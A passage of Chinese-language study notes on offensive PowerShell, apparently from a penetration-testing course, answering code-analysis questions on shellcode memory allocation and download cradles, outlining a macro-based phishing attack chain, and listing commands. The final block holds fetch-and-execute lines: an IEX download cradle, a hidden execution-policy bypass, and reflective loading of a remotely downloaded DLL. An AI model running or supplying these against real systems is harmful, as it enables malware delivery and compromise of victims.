### 代码分析题答案

**3.1 PowerShell 代码分析**：

1. 使用 P/Invoke 调用 VirtualAlloc 分配内存
2. Here-String，用于定义多行文本
3. 0x3000 = MEM_COMMIT | MEM_RESERVE，0x40 = PAGE_EXECUTE_READWRITE
4. 分配的内存地址
5. 分配可执行内存，可能用于执行 shellcode

**3.2 下载摇篮代码分析**：

1. 从远程服务器下载并执行 PowerShell 脚本
2. 企业环境通常有代理服务器，需要通过代理访问外网
3. 使用当前用户的凭据进行代理认证
4. Invoke-Expression，执行下载的字符串作为 PowerShell 代码

## 六、知识点总结

### 核心概念

| 概念 | 说明 |
|------|------|
| Add-Type | 编译并加载 C# 代码 |
| P/Invoke | 调用非托管 DLL 函数 |
| DllImport | 导入 Win32 API |
| 下载摇篮 | 下载并执行远程代码 |
| 反射 | 运行时动态操作类型 |

### 关键 API

| API | 用途 |
|-----|------|
| VirtualAlloc | 分配内存 |
| CreateThread | 创建线程 |
| WaitForSingleObject | 等待线程 |
| Marshal.Copy | 复制内存 |
| Assembly.Load | 加载程序集 |

### 攻击流程

```
1. 生成 shellcode (msfvenom)
        ↓
2. 创建 PowerShell shellcode runner
        ↓
3. 部署到 Web 服务器
        ↓
4. 创建 VBA 宏（下载摇篮）
        ↓
5. 嵌入到 Word 文档
        ↓
6. 发送钓鱼邮件
        ↓
7. 受害者打开文档
        ↓
8. 获取 shell
```

### 常用命令

```powershell
# 下载摇篮
IEX(New-Object Net.WebClient).DownloadString('http://IP/script.ps1')

# 隐藏执行
powershell -ep bypass -w hidden -c "..."

# 反射加载
$data = (New-Object Net.WebClient).DownloadData('http://IP/payload.dll')
$assembly = [System.Reflection.Assembly]::Load($data)
```
